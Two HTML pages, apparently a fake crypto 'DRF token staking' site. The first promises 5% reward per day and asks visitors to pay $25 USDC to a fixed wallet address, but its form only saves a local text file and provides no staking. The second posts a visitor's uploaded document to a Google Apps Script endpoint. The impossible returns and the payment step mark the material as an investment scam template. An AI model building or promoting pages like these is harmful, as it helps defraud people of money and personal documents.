<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Stake DRF Tokens</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #f4f6f9;
    }
    h2 {
      color: #333;
    }
    .form-group {
      margin-bottom: 15px;
    }
    input, select, button {
      padding: 10px;
      width: 100%;
      margin-top: 5px;
      box-sizing: border-box;
    }
    .notice {
      background: #e0f7fa;
      padding: 10px;
      border-left: 4px solid #00acc1;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <h2>Stake Your DRF Tokens</h2>
  <div class="notice">
    Minimum 30-day lock-in. 5% reward per day. Start staking by paying $25 USDC to address:
    <b>0x88253D87990EdD1E647c3B6eD21F57fb061a3040</b>
  </div>

  <form id="stakingForm">
    <div class="form-group">
      <label>Your Wallet Address</label>
      <input type="text" name="wallet" required>
    </div>
    <div class="form-group">
      <label>USDC Paid Amount (min $25)</label>
      <input type="number" name="amount" min="25" required>
    </div>
    <button type="submit">Submit Staking Request</button>
  </form>

  <script>
    document.getElementById('stakingForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const wallet = e.target.wallet.value;
      const amount = e.target.amount.value;
      const content = `Wallet Address: ${wallet}\nUSDC Amount: ${amount}\nDate: ${new Date().toLocaleString()}`;
      const blob = new Blob([content], { type: 'text/plain' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = `staking_request_${wallet}.txt`;
      a.click();
      alert('Request saved. Send $25 to the above USDC address to begin staking.');
    });
  </script>
</body>
</html>

<!DOCTYPE html>
<html>
<head>
  <title>Stake DRF</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h2>Stake DRF Tokens</h2>
  <form id="stakingForm">
    <label>DRF Wallet Address:</label>
    <input type="text" id="walletAddress" required><br>

    <label>Amount to Stake:</label>
    <input type="number" id="stakeAmount" required><br>

    <label>Upload Document (optional):</label>
    <input type="file" id="fileUpload"><br><br>

    <button type="submit">Submit Staking</button>
  </form>

  <script>
    document.getElementById('stakingForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      uploadToDrive();
    });

    async function uploadToDrive() {
      const fileInput = document.getElementById('fileUpload');
      const file = fileInput.files[0];
      if (!file) {
        alert("No file uploaded. Proceeding without file.");
        return;
      }

      const reader = new FileReader();
      reader.onload = async function (e) {
        const base64 = e.target.result.split(',')[1];
        const uploadData = {
          contents: {
            fileName: file.name,
            fileBase64: base64,
            mimeType: file.type
          }
        };

        try {
          const response = await fetch("https://script.google.com/macros/s/AKfycby9XhmGdvUimYCNDeBUC3SO7_WleuoWS03t-CdGllWvkE4Fyje2MzU-RjHYXwQV9cJJ/exec", {
            method: "POST",
            body: JSON.stringify(uploadData),
            headers: {
              "Content-Type": "application/json"
            }
          });

          const result = await response.text();
          alert("Upload successful: " + result);
        } catch (err) {
          console.error(err);
          alert("Upload failed.");
        }
      };
    
  reader.readAsDataURL(file);
    }
  </script>
</body>
</html>
